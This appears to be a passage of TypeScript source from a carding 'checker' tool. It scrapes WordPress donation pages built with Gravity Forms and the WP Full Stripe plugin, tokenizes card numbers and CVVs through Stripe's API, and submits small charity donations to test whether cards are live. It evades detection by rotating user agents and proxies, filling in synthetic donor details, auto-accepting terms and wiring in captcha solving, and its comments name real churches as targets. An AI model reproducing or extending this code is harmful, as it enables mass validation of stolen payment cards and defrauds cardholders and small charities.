              ...(resumeToken ? { return_url: `${cleanSiteUrl}/?gf-stripe-saas-return=1&resume_token=${resumeToken}` } : {}),
            });
            const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, connectedAccount), {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ua,
                Origin: "https://js.stripe.com",
                Referer: "https://js.stripe.com/",
              },
              body: confirmBody.toString(),
            });
            const confirmResult = await confirmResp.json();
            const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, stripeKey, connectedAccount);
            classified.latency = Date.now() - start;
            classified.cardInfo = fullCardInfo;
            return classified;
          }

          if (piData.data?.clientSecret || piData.clientSecret) {
            const clientSecret = piData.data?.clientSecret || piData.clientSecret;
            const resumeToken: string = piData.data?.resume_token || piData.data?.resumeToken || "";
            const piId = clientSecret.split("_secret_")[0];
            const confirmBody = new URLSearchParams({
              payment_method: pmId,
              expected_payment_method_type: "card",
              use_stripe_sdk: "true",
              key: stripeKey,
              client_secret: clientSecret,
              ...(resumeToken ? { return_url: `${cleanSiteUrl}/?gf-stripe-saas-return=1&resume_token=${resumeToken}` } : {}),
            });
            const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, connectedAccount), {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ua,
                Origin: "https://js.stripe.com",
                Referer: "https://js.stripe.com/",
              },
              body: confirmBody.toString(),
            });
            const confirmResult = await confirmResp.json();
            const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, stripeKey, connectedAccount);
            classified.latency = Date.now() - start;
            classified.cardInfo = fullCardInfo;
            return classified;
          }
        } catch {}
      }
    }

    const gfFormSubmitResult = await (async (): Promise<CheckResult | null> => {
      if (!formId || !lastCrawledPath) return null;
      try {
        const submitBody = new URLSearchParams({
          [`input_1.3`]: firstName,
          [`input_1.6`]: lastName,
          [`input_2`]: email,
          [`input_3`]: "100",
          [`gform_ajax`]: `form_id=${formId}&title=&description=&tabindex=0`,
          is_submit: formId,
          gform_submit: formId,
          gform_unique_id: "",
          state: "",
          gform_target_page_number: "0",
          gform_source_page_number: "1",
          gform_field_values: "",
          [`stripe_response`]: JSON.stringify({ id: pmId, object: "payment_method" }),
        });

        const submitResp = await sessionFetch(`${cleanSiteUrl}${lastCrawledPath}`, state, {
          method: "POST",
          body: submitBody.toString(),
          contentType: "application/x-www-form-urlencoded",
          referer: `${cleanSiteUrl}${lastCrawledPath}`,
          origin: cleanSiteUrl,
        });

        dbg(`[gravityforms] Form submit response (${submitResp.text.length} chars): ${submitResp.text.substring(0, 200)}`);

        const csMatch = submitResp.text.match(/client_secret["':=\s]+["']?(pi_[^"'&\s]+|seti_[^"'&\s]+)/);
        if (csMatch) {
          const clientSecret = csMatch[1];
          const piId = clientSecret.split("_secret_")[0];
          const confirmBody = new URLSearchParams({
            payment_method: pmId,
            expected_payment_method_type: "card",
            use_stripe_sdk: "true",
            key: stripeKey,
            client_secret: clientSecret,
          });
          const intentType = piId.startsWith("seti_") ? "setup_intents" : "payment_intents";
          const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/${intentType}/${piId}/confirm`, connectedAccount), {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              "User-Agent": ua,
              Origin: "https://js.stripe.com",
              Referer: "https://js.stripe.com/",
            },
            body: confirmBody.toString(),
          });
          const confirmResult = await confirmResp.json();
          const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, stripeKey, connectedAccount);
          classified.latency = Date.now() - start;
          classified.cardInfo = fullCardInfo;
          // Persist STABLE values discovered during the GF scrape. Nonces +
          // hashes are deliberately excluded � see CheckResult.discoveredSettings.
          classified.discoveredSettings = {
            ...(connectedAccount && connectedAccount !== extras?.connectedAccount ? { connectedAccount } : {}),
            ...(stripeKey        && stripeKey        !== publicKey                ? { publicKey: stripeKey } : {}),
            ...(formId           && formId           !== gfFormId                 ? { gfFormId: formId } : {}),
          };
          return classified;
        }
      } catch {}
      return null;
    })();

    if (gfFormSubmitResult) return gfFormSubmitResult;

    // GravityForms sites are donation-only � they have no WC shop.
    // Skip the WC cart flow entirely and go straight to tokenize.
    dbg(`[gravityforms] All GF approaches failed, falling back to tokenize`);
    const chargeResult = await stripeTokenize(cardNumber.trim(), month, year.slice(-2), cvv.trim(), stripeKey, gateName, cleanSiteUrl, start);
    chargeResult.latency = Date.now() - start;
    chargeResult.cardInfo = fullCardInfo;
    return chargeResult;

  } catch (e: any) {
    return { status: "error", response: `GravityForms Error: ${e.message}`, code: "gf_error", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  }
}

/**
 * WP Full Stripe checker.
 *
 * Targets the "WP Full Stripe" WordPress plugin by Mammothology (commercial).
 * Two variants of the same plugin exist in the wild:
 *   - Payment   forms: action=wp_full_stripe_inline_payment_charge
 *                      uses wpfs-custom-amount-unique + wpfs-custom-input[] anti-spam fields
 *                      (reference: gatetq.py against torr.ie)
 *   - Donation  forms: action=wp_full_stripe_inline_donation_charge
 *                      uses wpfs-custom-amount + wpfs-donation-frequency
 *                      (reference: rivernetworkchurch.org.uk/tithes-offerings/)
 *
 * The checker:
 *   1. Fetches the donate page to scrape: form-name (site-specific!), default
 *      amount, action name (decides payment vs donation variant), publishable
 *      key, optional custom-input fields.
 *   2. Tokenises the card via Stripe public API ? gets payment_method id.
 *   3. POSTs the right shape to /wp-admin/admin-ajax.php.
 *   4. Classifies the response with our shared keyword bucket.
 */
export async function checkCardStripeWpFullStripe(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  donatePath?: string,
  extras?: GateExtras
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 2) year = "20" + year;
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name      = extras?.billingName  || rndName();
  const email     = extras?.billingEmail || rndEmail();
  const stripeVer = pick(STRIPE_JS_VERSIONS);

  try {
    let state: SessionState = {
      ua, secChUa,
      cookies: extras?.rawCookies || "",
      proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined,
      captchaProvider: extras?.captchaProvider,
      captchaApiKey: extras?.captchaApiKey,
    };

    // -- Step 1: fetch the donate/payment page to scrape required fields --
    // We can't hardcode `wpfs-form-name`: every site picks its own (e.g.
    // "RiverNetworkChurchDonation"). Without it the form's site-side handler
    // rejects with "Form not found" before even looking at the card.
    let normalizedDonatePath = donatePath;
    if (normalizedDonatePath) {
      if (normalizedDonatePath.startsWith("http")) {
        try { normalizedDonatePath = new URL(normalizedDonatePath).pathname; } catch {}
      }
      if (!normalizedDonatePath.startsWith("/")) normalizedDonatePath = "/" + normalizedDonatePath;
    }

    const pathsToTry = normalizedDonatePath
      ? [normalizedDonatePath, "/donate/", "/give/", "/payments/", "/tithes-offerings/"]
      : ["/donate/", "/give/", "/payments/", "/tithes-offerings/", "/donation/", "/support/"];

    let wpfsAction = "";
    // Seed from gate settings (auto-detector populates wpFsFormName at setup
    // time). Page scrape still runs and overwrites if a fresher value is found,
    // so a stale gate config doesn't fail the first check.
    let wpfsFormName = extras?.wpFsFormName || "";
    let wpfsAmount = "";
    let wpfsMinAmount = 0;       // form's enforced minimum (0 = "not scraped")
    let foundPath = "";
    // Admin-ajax endpoint. Operator override > scraped JS variable > default.
    // Why scrape: river 404 case where WP routed /wp-admin/admin-ajax.php to
    // its 404 handler. The site's own JS knows the real URL (rewritten by a
    // security plugin, moved to /api/, etc.). We honor it.
    let wpfsAjaxUrl = extras?.ajaxUrl || "";
    // Every wpfs-* input the form actually has � scraped from the page so we
    // can reproduce it in the POST body. Captures field type + label so we
    // can fill synthetic values that match the field's expectation. Real
    // failure that motivated this: a site labeled a wpfs-custom-input (no
    // brackets) as "Donor Name(s)" and rejected the POST with strict field
    // validation when we didn't send it.
    type WpfsFormField = { name: string; type: string; defaultValue: string; label: string; isArray: boolean };
    const wpfsFormFields: WpfsFormField[] = [];
    // Field schema mined from wpfsFormOptions JS object (Upgrade 2: more
    // powerful form fetching). When the plugin's wp_localize_script block is
    // present, this is the AUTHORITATIVE list of required fields � beats
    // HTML scraping because the fields are usually JS-rendered, not in <input>
    // tags. We extract it once per check and use it to fill required fields
    // we'd otherwise miss (wpfs-nonce, terms-of-use, custom-input, etc.).
    let wpfsJsFieldSchema: Record<string, any> | null = null;
    let wpfsJsNonce = "";
    let wpfsRequiresCaptcha = false;
    let detectedKey = extras?.connectedAccount ? publicKey : publicKey; // publicKey wins; gate may not have one

    for (const path of pathsToTry) {
      try {
        const resp = await sessionFetch(`${cleanSiteUrl}${path}`, state);
        state = resp.state;
        if (!resp.ok) continue;

        // Detect plugin variant
        if (/wp_full_stripe_inline_donation_charge/.test(resp.text)) wpfsAction = "wp_full_stripe_inline_donation_charge";
        else if (/wp_full_stripe_inline_payment_charge/.test(resp.text)) wpfsAction = "wp_full_stripe_inline_payment_charge";

        // Form name (required, site-specific)
        const fn = resp.text.match(/name=['"]wpfs-form-name['"][^>]*value=['"]([^'"]+)['"]/)
                || resp.text.match(/value=['"]([^'"]+)['"][^>]*name=['"]wpfs-form-name['"]/);
        if (fn) wpfsFormName = fn[1];

        // Default amount � scrape BOTH wpfs-custom-amount (preset radios) AND
        // wpfs-custom-amount-unique (free-text). Some sites only have the
        // unique variant; only scraping `wpfs-custom-amount` was missing those
        // forms entirely, so we'd fall through to the "1.00" hardcoded default.
        if (!wpfsAmount) {
          const amt = resp.text.match(/name=['"]wpfs-custom-amount['"][^>]*value=['"]([0-9.]+)['"]/)
                   || resp.text.match(/value=['"]([0-9.]+)['"][^>]*name=['"]wpfs-custom-amount['"]/)
                   || resp.text.match(/name=['"]wpfs-custom-amount-unique['"][^>]*value=['"]([0-9.]+)['"]/)
                   || resp.text.match(/value=['"]([0-9.]+)['"][^>]*name=['"]wpfs-custom-amount-unique['"]/);
          if (amt) wpfsAmount = amt[1];
        }

        // Pick up a fresh publishable key from the page if the gate didn't have one
        if (!detectedKey || !/^pk_/.test(detectedKey)) {
          const pkM = resp.text.match(/pk_live_[A-Za-z0-9_]{20,}/) || resp.text.match(/pk_test_[A-Za-z0-9_]{20,}/);
          if (pkM) detectedKey = pkM[0];
        }

        // Scrape the site's own admin-ajax URL from inline JS. WP plugins
        // localize this variable for their JS to read � we read the same
        // value. Catches sites that moved admin-ajax behind a security plugin
        // or URL rewrite (real failure on rivernetworkchurch where the
        // default /wp-admin/admin-ajax.php returned a 404 page).
        // Patterns ordered most-specific ? most-generic so wpfs-specific wins.
        if (!wpfsAjaxUrl) {
          const ajaxUrlPatterns: RegExp[] = [
            /["']wpfs[_-]?ajax[_-]?url["']\s*[:=]\s*["']([^"']+)["']/i,
            /wpfsAjax\s*=\s*\{[^}]*["']url["']\s*:\s*["']([^"']+)["']/,
            /wp_full_stripe[_a-z]*\s*=\s*\{[^}]*["']ajax(?:_?url)?["']\s*:\s*["']([^"']+)["']/i,
            /["']ajaxurl["']\s*[:=]\s*["']([^"']+admin-ajax\.php[^"']*)["']/i,
            /var\s+ajaxurl\s*=\s*["']([^"']+)["']/i,
          ];
          for (const p of ajaxUrlPatterns) {
            const m = resp.text.match(p);
            if (m && m[1]) {
              wpfsAjaxUrl = m[1].replace(/\\\//g, "/");
              break;
            }
          }
        }

        // Form's minimum amount � if the site enforces a minimum higher than
        // our $1 default, the validator rejects the submission outright. Look
        // for the explicit data-min attribute or a min="X" input attribute on
        // the amount input itself.
        if (!wpfsMinAmount) {
          const minM = resp.text.match(/name=['"]wpfs-custom-amount(?:-unique)?['"][^>]*min=['"]([0-9.]+)['"]/)
                    || resp.text.match(/data-wpfs-min(?:imum)?=['"]([0-9.]+)['"]/);
          if (minM) wpfsMinAmount = parseFloat(minM[1]) || 0;
        }

        // -- Scrape EVERY wpfs-* input on the page -------------------------
        // Different installs add/remove required custom fields ("Donor Name(s)",
        // "Phone", "In memory of", etc.) and rename them with hash suffixes
        // (wpfs-custom-input--M2E5YzE--0). The validator's "Please enter a
        // value for 'X'" rejection means we must send each input it expects.
        // Captures: name, type, default value, nearby <label> text. Skip the
        // ones we already explicitly handle (action, form-name, amount,
        // pm-id, email, name).
        if (wpfsFormFields.length === 0) {
          const handled = new Set([
            "wpfs-form-name", "wpfs-form-get-parameters",
            "wpfs-card-holder-email", "wpfs-card-holder-name",
            "wpfs-stripe-payment-method-id",
            "wpfs-custom-amount", "wpfs-custom-amount-unique",
            "wpfs-donation-frequency",
          ]);
          const inputRe = /<input[^>]+name=['"](wpfs-[a-zA-Z0-9_\-\[\]]+)['"][^>]*>/g;
          const seen = new Set<string>();
          for (const m of resp.text.match(inputRe) || []) {
            const nm = m.match(/name=['"]([^'"]+)['"]/)?.[1] || "";
            if (!nm || handled.has(nm)) continue;
            // The same custom-input array slot can appear multiple times � keep
            // each occurrence so we send the right number of [] entries.
            const isArr = nm.endsWith("[]");
            const key = isArr ? nm + "::" + seen.size : nm;
            if (seen.has(key)) continue;
            seen.add(key);
            const ty = m.match(/type=['"]([^'"]+)['"]/)?.[1] || "text";
            const vl = m.match(/value=['"]([^'"]{0,200})['"]/)?.[1] || "";
            const id = m.match(/id=['"]([^'"]+)['"]/)?.[1] || "";
            // Find a <label for="..."> matching the input id, or text just
            // before the input tag, to learn what the field is called.
            let label = "";
            if (id) {
              const lm = resp.text.match(new RegExp(`<label[^>]+for=['"]${id.replace(/[.*+?^${}()|[\\]\\\\]/g, "\\\\$&")}['"][^>]*>([^<]{1,80})<`));
              if (lm) label = lm[1].trim();
            }
            wpfsFormFields.push({ name: nm, type: ty, defaultValue: vl, label, isArray: isArr });
          }
        }

        // -- Upgrade 2: mine wpfsFormOptions for the AUTHORITATIVE field list.
        // The JS object carries every field the plugin's renderer knows about,
        // including ones never written as <input> tags. We get this once and
        // use it to know exactly which extra fields to send.
        if (!wpfsJsFieldSchema) {
          const opts = extractInlineJsObject(resp.text, "wpfsFormOptions");
          if (opts && opts.wpfsFormFields) {
            // Map our wpfsAction ? the wpfsFormFields sub-mode key.
            const modeKey = wpfsAction === "wp_full_stripe_inline_donation_charge" ? "inlineDonation"
                          : wpfsAction === "wp_full_stripe_inline_payment_charge"  ? "inlinePayment"
                          : null;
            if (modeKey && opts.wpfsFormFields[modeKey]) {
              wpfsJsFieldSchema = opts.wpfsFormFields[modeKey];
              wpfsRequiresCaptcha = Object.keys(wpfsJsFieldSchema || {}).includes("g-recaptcha-response");
              const fieldList = Object.keys(wpfsJsFieldSchema || {}).sort();
              dbg(`[wpfs] mined wpfsFormOptions.${modeKey}: ${fieldList.length} fields � ${fieldList.slice(0, 8).join(", ")}${fieldList.length > 8 ? ", �" : ""}`);
              if (wpfsRequiresCaptcha) dbg(`[wpfs] ? form requires g-recaptcha-response � solver not yet wired for WPFS`);
            }
          }
        }
        // wpfs-nonce sometimes ships in inline JS even when not in <input>.
        if (!wpfsJsNonce) {
          const nm = resp.text.match(/["']wpfs[_-]?nonce["']\s*:\s*["']([^"']{8,})["']/i)
                  || resp.text.match(/name=["']wpfs-nonce["'][^>]*value=["']([^"']+)["']/);
          if (nm) wpfsJsNonce = nm[1];
        }

        if (wpfsAction && wpfsFormName) { foundPath = path; break; }
      } catch { /* try next path */ }
    }

    if (!wpfsAction || !wpfsFormName) {
      return {
        status: "error",
        response: `WP Full Stripe: form not found (missing ${!wpfsAction ? "action" : "form-name"}) � set donatePath in gate to the donation page URL`,
        code: "no_wpfs_form",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }
    if (!detectedKey) {
      return {
        status: "error",
        response: `WP Full Stripe: no Stripe publishable key found on page`,
        code: "no_publishable_key",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    // -- ALWAYS-ON custom-input safety net ---------------------------------
    // The WP Full Stripe admin lets the merchant define custom required input
    // fields ("Donor Name(s)", "In memory of", etc.) per form. The field
    // schema lives in admin-side PHP config + a JS-rendered template � NOT
    // in the static donate-page HTML. So scraping <input> tags can't see
    // these fields, and we'd hit "Please enter a value for 'X'" rejections.
    //
    // Confirmed by inspection: wpfsFormOptions on the page contains the
    // selector template "#{fieldId}" with a runtime-substituted hash id,
    // and the WP REST API at /wp-json/ has been stripped (numeric-only
    // namespaces) so we can't query for the schema either.
    //
    // Fix: ALWAYS send at least one wpfs-custom-input value (the synthetic
    // donor name we already generate). Cost: zero on sites that don't use
    // custom inputs (extra field is ignored). Benefit: clears single-field
    // rejections like "Please enter a value for 'Donor Name(s)'" without
    // needing the operator to touch anything.
    //
    // For sites with MULTIPLE custom inputs, the operator can set
    // settings.wpfsCustomInputCount to send that many entries. Each gets
    // a plausible filler value (donor name / number / phone) cycled
    // through to look like real per-field data.
    // Decide how many custom-input values to send AFTER the field-loop runs
    // (handled directly via wpBody.append below � see "Custom-input safety net"
    // section). Computed here so the value is in scope at the POST step.
    const explicitCount = (() => {
      const n = parseInt(String((extras as any)?.wpfsCustomInputCount ?? ""), 10);
      return Number.isFinite(n) && n > 0 ? n : 0;
    })();
    const scrapedHasCustomInput = wpfsFormFields.some(f => f.name === "wpfs-custom-input" || f.name === "wpfs-custom-input[]");
    const customInputCount = explicitCount || (scrapedHasCustomInput ? 0 : 1);

    // CAPTCHA guard � if the JS schema declared g-recaptcha-response as
    // required and the operator hasn't configured a captcha solver, fail
    // fast with a clear actionable error instead of POSTing a doomed request
    // and getting back "Field validation error" with no actionable hint.
    if (wpfsRequiresCaptcha && !extras?.captchaApiKey) {
      return {
        status: "error",
        response: `WP Full Stripe: form requires reCAPTCHA (g-recaptcha-response). Set settings.captchaProvider + captchaApiKey to enable solving, or pick a non-captcha gate.`,
        code: "wpfs_captcha_required",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    // Upgrade 1: REST namespace probe � fires once per check. If the API
    // exposes named namespaces (not just numeric placeholders some plugins
    // emit to block discovery), log what's available. Strictly diagnostic;
    // no downstream behavior change today, but the operator sees in dbg
    // whether REST is open or stripped, which decides whether further
    // automation (form-schema queries via REST) is viable for this site.
    const restNs = await probeWpRestNamespaces(cleanSiteUrl, state);
    if (restNs.length) dbg(`[wpfs] REST namespaces: ${restNs.slice(0, 8).join(", ")}${restNs.length > 8 ? ", �" : ""}`);
    else dbg(`[wpfs] REST namespaces stripped/blocked � relying on HTML+JS scrape only`);

    dbg(`[wpfs] Detected action=${wpfsAction} form=${wpfsFormName} amount=${wpfsAmount || "(none)"} path=${foundPath}`);

    // -- Step 2: tokenise card via Stripe Payment Method API --
    // We hit the public `payment_methods` endpoint with `key=<pk_live>` �
    // identical to the call Stripe.js makes from a browser.
    const pmBody = new URLSearchParams();
    pmBody.set("type", "card");
    pmBody.set("billing_details[name]", name);
    pmBody.set("billing_details[email]", email);
    pmBody.set("billing_details[address][line1]", (billing as any).line1 || "123 Main St");
    pmBody.set("billing_details[address][city]", billing.city);
    pmBody.set("billing_details[address][state]", billing.stateCode);
    pmBody.set("billing_details[address][postal_code]", billing.zip);
    pmBody.set("billing_details[address][country]", billing.country);
    pmBody.set("card[number]", cardNumber.trim());
    pmBody.set("card[cvc]", cvv.trim());
    pmBody.set("card[exp_month]", month);
    pmBody.set("card[exp_year]", year);
    pmBody.set("guid", crypto.randomUUID());
    pmBody.set("muid", crypto.randomUUID());
    pmBody.set("sid", crypto.randomUUID());
    pmBody.set("payment_user_agent", `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; card-element`);
    pmBody.set("referrer", cleanSiteUrl);
    pmBody.set("time_on_page", String(Math.floor(Math.random() * 30000) + 5000));
    pmBody.set("key", detectedKey);

    const pmResp = await sessionFetch("https://api.stripe.com/v1/payment_methods", state, {
      method: "POST",
      body: pmBody.toString(),
      contentType: "application/x-www-form-urlencoded",
      accept: "application/json",
      origin: "https://js.stripe.com",
      referer: "https://js.stripe.com/",
      timeout: extras?.timeout || 12000,
    });
    state = pmResp.state;

    let pmResult: any = {};
    try { pmResult = JSON.parse(pmResp.text); } catch {
      return {
        status: "error",
        response: `WP Full Stripe: tokenize returned non-JSON`,
        code: "wpfs_tokenize_bad_response",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
        rawSnippet: pmResp.text.slice(0, 500),
      };
    }

    // Extract card meta from Stripe's PM response (so the result line shows
    // brand/funding/country exactly like our other flows)
    const card = pmResult?.card || {};
    const brand   = (card.brand || "UNKNOWN").toUpperCase();
    const funding = card.funding || "unknown";
    const country = card.country || "??";
    const threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
    const cardMeta: CardMeta = { brand, funding, country, threeDs, billing };

    if (!pmResult.id) {
      // Stripe rejected the card at tokenize step � route through our normal
      // decline classifier so a real PAN error (incorrect_number / expired)
      // becomes DECLINED rather than a generic "no PM" error.
      if (pmResult.error) {
        const classified = classifyStripeResponse(pmResult, gateName, cardMeta);
        classified.latency = Date.now() - start;
        classified.cardInfo = fullCardInfo;
        return classified;
      }
      return {
        status: "error",
        response: `WP Full Stripe: tokenize did not return a payment_method id`,
        code: "wpfs_no_pm_id",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }
    const pmId: string = pmResult.id;
    dbg(`[wpfs] Got payment_method ${pmId}`);

    // -- Step 3: POST to admin-ajax with WP Full Stripe shape --
    // The two variants differ in fields. Donation has frequency. Payment uses
    // -unique amount + custom-input[] anti-spam slots.
    // Amount selection: operator override > scraped page default > 1.00; clamp
    // up to the form's enforced minimum if we scraped one (avoids the
    // "amount is invalid" rejection we hit on the GiveWP gate earlier).
    let amountFloat = parseFloat(clampAmount(extras?.donateAmount, wpfsAmount || "1.00"));
    if (wpfsMinAmount && amountFloat < wpfsMinAmount) amountFloat = wpfsMinAmount;
    const overrideAmount = amountFloat.toFixed(2);
    // Diagnostic so the operator can see exactly where the final amount came
    // from � operator-override / scraped-page / fallback � when something
    // looks wrong like "I set $5 but it charged $0.60". Without this log the
    // amount tier was a black box.
    dbg(`[wpfs] amount: operator=${extras?.donateAmount || "(none)"} scraped=${wpfsAmount || "(none)"} formMin=${wpfsMinAmount || "(none)"} ? sending=$${overrideAmount}`);

    const wpBody = new URLSearchParams();
    wpBody.set("action", wpfsAction);
    wpBody.set("wpfs-form-name", wpfsFormName);
    wpBody.set("wpfs-form-get-parameters", "{}");
    wpBody.set("wpfs-card-holder-email", email);
    wpBody.set("wpfs-card-holder-name", name);
    wpBody.set("wpfs-stripe-payment-method-id", pmId);

    // Amount variant � some sites use wpfs-custom-amount, others -unique, some
    // require BOTH. Failure that motivated this: a donation-action form on a
    // newly-tested site rejected with "Please enter a value for wpfs-custom-
    // amount-unique" even though the action said donation (which normally maps
    // to wpfs-custom-amount). Safest path: ALWAYS send both. Costs nothing if
    // not required; satisfies the validator when it is.
    if (wpfsAction === "wp_full_stripe_inline_donation_charge") {
      wpBody.set("wpfs-custom-amount", overrideAmount);
      // Send unique too when the form has it � costs nothing if not required.
      wpBody.set("wpfs-custom-amount-unique", overrideAmount);
      wpBody.set("wpfs-donation-frequency", extras?.donationType === "subscription" ? "monthly" : "one-time");
    } else {
      wpBody.set("wpfs-custom-amount-unique", overrideAmount);
      wpBody.set("wpfs-custom-amount", overrideAmount);
    }

    // Reproduce EVERY other wpfs-* field the form has, with a synthetic value
    // matching the field's type/label. This catches site-specific custom
    // required inputs (e.g. "Donor Name(s)", "Phone Number", "In memory of")
    // that hardcoded 3 honeypot slots can't anticipate.
    // Picker: type-based first (email/tel/number), then label-based (looking
    // for name/phone/address keywords), then a sensible plausible default.
    for (const f of wpfsFormFields) {
      let value = f.defaultValue;
      if (!value) {
        const labelLower = (f.label || "").toLowerCase();
        const ty = (f.type || "text").toLowerCase();
        if (ty === "email" || labelLower.includes("email"))           value = email;
        else if (ty === "tel" || labelLower.includes("phone"))        value = "07" + String(Math.floor(Math.random() * 90000000) + 10000000);
        else if (ty === "number")                                     value = String(Math.floor(Math.random() * 90) + 10);
        else if (labelLower.includes("name") || labelLower.includes("donor")) value = name;
        else if (labelLower.includes("address"))                      value = billing.line1;
        else if (labelLower.includes("city"))                         value = billing.city;
        else if (labelLower.includes("zip") || labelLower.includes("postcode") || labelLower.includes("post code")) value = billing.zip;
        else if (labelLower.includes("country"))                      value = billing.country;
        else if (labelLower.includes("comment") || labelLower.includes("note") || labelLower.includes("message")) value = "Thank you";
        // Honeypot fallback: rotate number / word / phone-ish for any other
        // unnamed slot. Matches the gatetq.py pattern for sites that have
        // unlabeled wpfs-custom-input[] slots.
        else {
          const r = Math.random();
          if (r < 0.33) value = String(Math.floor(Math.random() * 90000) + 10000);
          else if (r < 0.66) value = rndStr(8).replace(/^./, (c) => c.toUpperCase());
          else value = "07" + String(Math.floor(Math.random() * 90000000) + 10000000);
        }
      }
      if (f.isArray) wpBody.append(f.name, value);
      else wpBody.set(f.name, value);
    }
    // -- Custom-input safety net -------------------------------------------
    // Admin-configured "wpfs-custom-input" fields (e.g. "Donor Name(s)") are
    // JS-rendered and NOT in static HTML � confirmed by direct inspection of
    // rivernetworkchurch.org.uk: page has wpfsFormOptions with a runtime
    // selector template "#{fieldId}", no actual <input> tags for these
    // fields. REST API blocked too (only numeric namespaces). So scraping
    // can't find them; the only path that works is "send a synthetic value".
    //
    // Append BEFORE the existing wpfsFormFields loop so we don't double-send
    // when the scrape DID happen to find a wpfs-custom-input � the count
    // computed above is 0 in that case.
    //
    // Using append (not set) so multiple entries each survive as separate
    // form-data fields. WPFS validator iterates by hashed id, so each
    // declared custom-input gets a value. Bare key (no []), matching the
    // exact name= the error response carries.
    for (let i = 0; i < customInputCount; i++) {
      const v = i === 0 ? name
              : i === 1 ? "07" + String(Math.floor(Math.random() * 90000000) + 10000000)
              : String(Math.floor(Math.random() * 90000) + 10000);
      wpBody.append("wpfs-custom-input", v);
    }
    if (customInputCount > 0) {
      dbg(`[wpfs] appended ${customInputCount} synthetic wpfs-custom-input value(s) � admin-configured custom required fields are JS-rendered, can't be scraped from HTML`);
    }

    // -- Upgrade 2 (cont.): fill JS-schema-required fields we previously missed.
    // wpfsFormOptions.wpfsFormFields.inlineDonation listed wpfs-nonce and
    // wpfs-terms-of-use-accepted as required on river � neither shows up as
    // an <input> tag in static HTML so the regex scrape missed both, and the
    // POST got rejected for those fields. Now we fill them when the schema
    // says they're required.
    if (wpfsJsFieldSchema) {
      const schemaKeys = Object.keys(wpfsJsFieldSchema);
      // wpfs-nonce � scraped from inline JS if present; if not, the form
      // validator may still accept an empty value (some sites don't enforce)
      // but try to send what we have.
      if (schemaKeys.includes("wpfs-nonce") && wpfsJsNonce && !wpBody.has("wpfs-nonce")) {
        wpBody.set("wpfs-nonce", wpfsJsNonce);
      }
      // Terms-of-use checkbox � when listed as required, the form expects "on"
      // (HTML checkbox checked value). Submitting without it triggers the
      // "Please accept terms" validation. Auto-tick it.
      if (schemaKeys.includes("wpfs-terms-of-use-accepted") && !wpBody.has("wpfs-terms-of-use-accepted")) {
        wpBody.set("wpfs-terms-of-use-accepted", "on");
      }
      // Same-billing-and-shipping-address checkbox � when present and we're
      // sending billing only (no separate shipping fields), declare matching.
      if (schemaKeys.includes("wpfs-same-billing-and-shipping-address") && !wpBody.has("wpfs-same-billing-and-shipping-address")) {
        wpBody.set("wpfs-same-billing-and-shipping-address", "on");
      }
      dbg(`[wpfs] filled JS-schema fields: nonce=${!!wpfsJsNonce && schemaKeys.includes("wpfs-nonce")}, terms=${schemaKeys.includes("wpfs-terms-of-use-accepted")}, same-shipping=${schemaKeys.includes("wpfs-same-billing-and-shipping-address")}`);
    }

    dbg(`[wpfs] form fields sent: ${wpfsFormFields.length} (action=${wpfsAction})`);

    // Resolve the admin-ajax endpoint: operator override (extras) > scraped JS
    // variable from the page > hardcoded default. The scraped URL may be a
    // bare path (/wp-admin/admin-ajax.php) or relative (//domain/...) � make
    // it absolute so sessionFetch doesn't choke.
    let finalAjaxUrl = wpfsAjaxUrl || `${cleanSiteUrl}/wp-admin/admin-ajax.php`;
    if (finalAjaxUrl.startsWith("//")) finalAjaxUrl = "https:" + finalAjaxUrl;
    else if (finalAjaxUrl.startsWith("/")) finalAjaxUrl = cleanSiteUrl + finalAjaxUrl;
    else if (!finalAjaxUrl.startsWith("http")) finalAjaxUrl = `${cleanSiteUrl}/${finalAjaxUrl.replace(/^\/+/, "")}`;
    dbg(`[wpfs] admin-ajax endpoint: ${finalAjaxUrl}${wpfsAjaxUrl ? " (override)" : " (default)"}`);

    const ajaxResp = await sessionFetch(finalAjaxUrl, state, {
      method: "POST",
      body: wpBody.toString(),
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      accept: "application/json, text/javascript, */*; q=0.01",
      origin: cleanSiteUrl,
      referer: `${cleanSiteUrl}${foundPath}`,
      xRequestedWith: true,
      timeout: extras?.timeout || 20000,
    });
    state = ajaxResp.state;

    const rawText = ajaxResp.text;
    dbg(`[wpfs] admin-ajax response (${rawText.length} chars): ${rawText.slice(0, 240)}`);

    // -- 404 / Page-Not-Found guard ----------------------------------------
    // Real failure observed on rivernetworkchurch.org.uk: WordPress routed
    // our POST to its main 404 handler (62KB HTML "Page not found" template).
    // The card never reached the merchant. Without this guard, classifyBankText
    // ran on the 404 page ? no match ? fell to generic decline ? STRICT mode
